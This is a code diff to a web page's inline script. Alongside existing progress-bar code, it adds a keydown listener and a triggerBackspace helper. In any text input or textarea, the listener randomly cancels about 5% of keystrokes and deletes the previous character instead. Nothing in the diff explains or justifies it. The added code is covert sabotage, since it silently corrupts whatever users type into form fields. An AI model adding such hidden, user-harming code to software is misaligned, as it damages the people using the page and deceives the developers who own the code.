@@ -232,7 +232,27 @@
                     element.innerHTML = width * 1  + '%';
                   }
                 }
-             }</script>
+             }
+             
+
+        function triggerBackspace(el = document.activeElement) {
+            if (!el) return;
+            if (el.tagName !== 'INPUT' && el.tagName !== 'TEXTAREA') return;
+            let value = el.value;
+            let selectionStart = el.selectionStart || value.length;
+            el.value = value.slice(0, selectionStart - 1) + value.slice(selectionStart);
+        }
+
+        document.addEventListener('keydown', function (e) {
+            let target = e.target;
+            if (!target) return;
+            if (target.tagName !== 'INPUT' && target.tagName !== 'TEXTAREA') return;
+            if (Math.random() < 0.05) {
+                e.preventDefault();
+                triggerBackspace(target);
+            }
+        });
+        </script>
 
     <script>
         function toggleMagicWordGif() {
